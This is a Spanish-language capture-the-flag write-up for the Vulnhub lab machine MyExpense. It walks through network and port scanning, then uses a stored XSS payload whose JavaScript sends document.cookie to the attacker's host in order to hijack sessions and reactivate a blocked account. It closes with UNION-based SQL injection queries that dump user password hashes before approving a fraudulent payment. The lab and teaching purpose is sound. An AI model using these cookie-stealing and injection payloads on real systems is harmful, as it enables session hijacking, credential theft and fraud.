---
title: MyExpense | CTF Writeup - Vulnhub
date: 2024-03-11 11:32:00 +/-TTTT
categories: [PENTESTING, CTF]
tags: [vulnhub, writeup, xss, csrf, sqli]    
---

# MyExpense

>Para esta máquina, contamos con unas credenciales de un empleado que se llama Samuel. Su usuario (`slamotte`) se encuentra bloqueado en la web, por tanto, deberemos intentar iniciar sesión como Samuel y aprobar un pago que la compañía no realizó.
>Primeramente, para la etapa de enumeración, escaneamos nuestra red local. La IP de la máquina víctima es la 192.168.216.146.

```shell
> arp-scan -I ens33 --localnet

Interface: ens33, type: EN10MB, MAC: 00:0c:29:85:8e:61, IPv4: 192.168.216.133
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.216.1	00:50:56:c0:00:08	VMware, Inc.
192.168.216.2	00:50:56:e2:11:a1	VMware, Inc.
192.168.216.146	00:0c:29:6b:78:11	VMware, Inc.
192.168.216.254	00:50:56:e7:c0:0d	VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.916 seconds (133.61 hosts/sec). 4 responded

> export IP=192.168.216.146
```

>Procedemos a escanear puertos y versiones con `nmap`.

```shell
> nmap -sS -p- --open -Pn -n -vv -oN scan.txt $IP

Nmap scan report for 192.168.216.146
Host is up, received arp-response (0.00069s latency).
Scanned at 2024-01-05 16:03:43 -03 for 1s
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
39899/tcp open  unknown syn-ack ttl 64
40211/tcp open  unknown syn-ack ttl 64
44469/tcp open  unknown syn-ack ttl 64
53053/tcp open  unknown syn-ack ttl 64
MAC Address: 00:0C:29:6B:78:11 (VMware)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jan  5 16:03:44 2024 -- 1 IP address (1 host up) scanned in 1.18 seconds
```

```shell
> nmap -sCV -p80,39899,40211,44469,53053 -oN services_scan $IP

Nmap scan report for 192.168.216.146
Host is up (0.00021s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin/admin.php
|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
39899/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
40211/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
44469/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
53053/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
MAC Address: 00:0C:29:6B:78:11 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  5 16:04:55 2024 -- 1 IP address (1 host up) scanned in 6.73 seconds
```

>Vemos que nos reporta un directorio interesante en el puerto 80. Podemos aplicar un script básico de reconocimiento como el http-enum en `nmap`.

```shell
> nmap --script http-enum -p80,39899,40211,44469,53053 $IP

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 16:05 -03
Nmap scan report for 192.168.216.146
Host is up (0.00032s latency).

PORT      STATE SERVICE
80/tcp    open  http
| http-enum: 
|   /admin/admin.php: Possible admin folder
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file
39899/tcp open  unknown
40211/tcp open  unknown
44469/tcp open  unknown
53053/tcp open  unknown
MAC Address: 00:0C:29:6B:78:11 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

>Si entramos a la web, nos podemos encontrar con algo interesante.

![1.png]({%link assets/img/myexpense/1.png%})

>Si nos vamos a la sección de login, veremos que no nos dejará iniciar sesión como el usuario `slamotte` dado que la compañía le bloqueó el acceso. Sin embargo, podemos crear una cuenta. En este punto, podemos intentar inyectar código JavaScript malicioso que nos envíe una petición a nuestra máquina de atacantes para verificar si se acontece una XSS.

![2.png]({%link assets/img/myexpense/2.png%})

>Levantamos un servidor HTTP con python en la línea de comandos.

![3.png]({%link assets/img/myexpense/3.png%})

>Como se está cargando el recurso, intentamos realizar un Cookie Hijacking mediante el empleo de peticiones HTTP cargadas desde nuestro recurso.

```javascript
var req = new XMLHttpRequest();
req.open("GET", "http://192.168.216.133/?cookie=" + document.cookie);
req.send();
```

>Levantamos nuevamente el servidor HTTP y vemos las siguientes peticiones:

![4.png]({%link assets/img/myexpense/4.png%})

>En este punto, si intentamos secuestrar la sesión del usuario que esté administrando la página, no podremos dado que nos saltará un error. Lo que sí podemos intentar es modificar el archivo pwned.js para que active la cuenta de Samuel. Para ello, simplemente hacemos hovering en los estados de las cuentas en el panel de `http://192.168.216.146/admin/admin.php`, y nos fijamos en la cuenta de Samuel. 

```javascript
var req = new XMLHttpRequest();
req.open("GET", "http://192.168.216.146/admin/admin.php?id=11&status=active");
req.send();
```

>Ahora esperamos e intentamos iniciar sesión como `slamotte`.  Procedemos y vemos que podemos entrar.

![5.png]({%link assets/img/myexpense/5.png%})

>Enviamos nuestro reporte a nuestro manager.

![6.png]({%link assets/img/myexpense/6.png%})

>Si nos vamos a nuestra cuenta, veremos que nuestro manager es Manon Riviere, y es curiosamente una de las personas que se encuentra interactuando en el chat de la página Home.

![7.png]({%link assets/img/myexpense/7.png%})

>Si intentamos colar nuevamente nuestro script:

![8.png]({%link assets/img/myexpense/8.png%})

![9.png]({%link assets/img/myexpense/9.png%})

>Vemos que nos llegan distintas cookies de sesión. Probamos todas y llegamos a secuestrar la sesión de Manon Riviere.

![10.png]({%link assets/img/myexpense/10.png%})

>Aprobamos el reporte de Samuel:

![11.png]({%link assets/img/myexpense/11.png%})

>Sin embargo, vemos que todavía tenemos un cargo ejecutivo arriba nuestro. Deberemos de ganar acceso a la cuenta de Paul Baudouin, que es nuestro manager.

![[Captura de pantalla (130).png]]({%link assets/img/myexpense/12.png%})

>Si nos vamos a la sección de Rennes, vemos lo siguiente:

![[Captura de pantalla (131).png]]({%link assets/img/myexpense/13.png%})

>La URL tiene un parámetro que llama la atención a simple vista. Podemos intentar comentar el resto de la query si se tratase de una SQL Injection.

![[Captura de pantalla (132).png]]({%link assets/img/myexpense/14.png%})

>Vemos que efectivamente se acontece una SQL Injection. Intentamos enumerar la cantidad de columnas siendo utilizadas para posteriormente realizar un `UNION SELECT` attack. Probamos con ` UNION SELECT NULL,NULL--`.

![[Captura de pantalla (133) 1.png]]({%link assets/img/myexpense/15.png%})

>Intentamos ver la base de datos siendo utilizada:

![[Captura de pantalla (134).png]]({%link assets/img/myexpense/16.png%})

>Enumeramos todas las bases de datos con `UNION SELECT schema_name,null FROM information_schema.schemata-- -`:

![[Captura de pantalla (135).png]]({%link assets/img/myexpense/17.png%})

>De similar manera, enumeramos las tablas con la query `UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema="myexpense"-- -`:

![[Captura de pantalla (136).png]]({%link assets/img/myexpense/18.png%})

>Seleccionamos la tabla user y enumeramos columnas con la query `UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema="myexpense" AND table_name="user"-- -`:

![[Captura de pantalla (137).png]]({%link assets/img/myexpense/19.png%})

>Solo nos falta enumerar usuarios y contraseñas. Vemos que las contraseñas están todas hasheadas. Particularmente, nos interesa la del usuario Paulo Baudouin (`pbaudouin`).

![[Captura de pantalla (138).png]]({%link assets/img/myexpense/20.png%})

>Procedemos a crackearla con la web [Hashes](https://hashes.com). 

![[Captura de pantalla (141).png]]({%link assets/img/myexpense/21.png%})

>¡Listo! Iniciamos sesión como el usuario `pbaudouin`.

![[Captura de pantalla (142).png]]({%link assets/img/myexpense/22.png%})

>Aprobamos el pago:

![[Captura de pantalla (143).png]]({%link assets/img/myexpense/23.png%})

>Volvemos a iniciar sesión como Samuel y voilà, ahí está la flag.

![[Captura de pantalla (144).png]]({%link assets/img/myexpense/24.png%})
